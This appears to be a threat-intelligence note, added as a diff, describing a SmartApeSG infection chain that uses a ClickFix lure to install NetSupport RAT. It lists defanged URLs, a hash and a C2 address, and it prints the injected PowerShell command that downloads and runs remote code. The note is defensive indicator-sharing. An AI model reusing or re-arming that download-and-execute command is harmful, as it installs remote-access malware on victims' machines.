@@ -1,0 +1,33 @@
+2025-06-27 (FRIDAY): SMARTAPESG INFECTION CHAIN LEADS TO CLICKFIX LURE FOR NETSUPPORT RAT
+
+REFERENCES:
+
+- https://infosec.exchange/@malware_traffic/114756862448741046
+- 
+
+URL SEQUENCE LEADING TO CLICKFIX PAGE:
+
+- hxxps[:]//palcomp3[.]top/sss/buf.js
+- hxxps[:]//palcomp3[.]top/sss/index.php?GQX1KqUM
+- hxxps[:]//palcomp3[.]top/sss/bof.js?19ec2a189848bc0bfa
+
+EXAMPLE OF SCRIPT INJECTED INTO VICTIM'S CLIPBOARD
+
+C:\WINDOWS\system32\cmd.exe /min /c powershell -NoP 
+-ExecutionPolicy Bypass -w 1 -c 
+"$p1='hxxps[:]//camplively';$p2='.com/all.php';
+$af=$p1+$p2; $xo=(Invoke-WebRequest -UseBasicParsing $af).Content; 
+Invoke-Expression $xo"
+
+URL SEQUENCE TO RETRIEVE ZIP ARCHIVE FOR NETSUPPORT RAT AFTER RUNNING ABOVE SCRIPT:
+
+- hxxps[:]//camplively[.]com/all.php
+- hxxps[:]//camplively[.]com/smks.zip?lap=3928
+
+SHA256 HASH FOR SMKS.ZIP ARCHIVE CONTAINING MALICIOUS NETSUPPORT RAT PACKAGE:
+
+- 3be246afee53241eaa9c1f74d6720cc5d1004846ded378bd4b1040064b5631c5
+
+NETSUPPORT RAT C2 TRAFFIC:
+
+- 185.163.45[.]30:443 - HTTP traffic
